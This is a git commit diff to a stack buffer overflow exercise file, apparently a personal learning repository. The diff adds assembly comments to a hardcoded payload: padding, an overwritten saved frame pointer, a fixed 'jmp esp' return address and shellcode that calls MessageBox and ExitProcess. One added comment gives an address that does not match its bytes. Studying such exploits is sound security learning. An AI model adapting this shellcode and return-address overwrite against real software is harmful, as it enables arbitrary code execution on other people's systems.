b7f8b84e24d3d6c4c1e6d4f48201426c1e451591
lufeirider <3020207744@qq.com>
2016-08-19 18:00:43 +0800

    Update overflow1.cpp

--- stack/overflow1.cpp
+++ stack/overflow1.cpp
@@ -5,13 +5,13 @@
 char name[] =	"\x41\x41\x41\x41\x41\x41\x41\x41"	// name[0]~name[7]
 				"\x41\x41\x41\x41"					//ebp
 				"\x79\x5b\xe3\x77"					//return address	jmp esp
-				"\x83\xEC\x50"						//sub esp,ebx
+				"\x83\xEC\x50"						//sub esp,50h
 				"\x33\xDB"							//xor ebx,ebx
 				"\x53"								//push ebx  也就是push 0
 				"\x68\x69\x6E\x67\x20"				//字符串
 				"\x68\x57\x61\x72\x6E"
 				"\x8B\xC4"
-				"\x53"
+				"\x53"								//push ebx  也就是push 0
 				"\x68\x75\x66\x65\x69"				//字符串
 				"\x68\x62\x79\x20\x6C"
 				"\x8B\xCC"							//mov eax,esp
@@ -19,11 +19,11 @@ char name[] =	"\x41\x41\x41\x41\x41\x41\x41\x41"	// name[0]~name[7]
 				"\x50"								//push eax
 				"\x51"								//push ecx
 				"\x53"								//push ebx
-				"\xB8\xEA\x07\xD5\x77"
-				"\xFF\xD0"							//call MessageBox
-				"\x53"
-				"\xB8\xA2\xBF\x81\x7C"		
-				"\xFF\xD0";							//call ExitPorecess
+				"\xB8\xEA\x07\xD5\x77"				//mov eax,0x77d507ea
+				"\xFF\xD0"							//call eax   				//call MessageBox
+				"\x53"								//push ebx  也就是push 0
+				"\xB8\xA2\xBF\x81\x7C"				//mov eax,0x7c81cafa
+				"\xFF\xD0";							//call eax					//call ExitPorecess
 
 int main()
 {
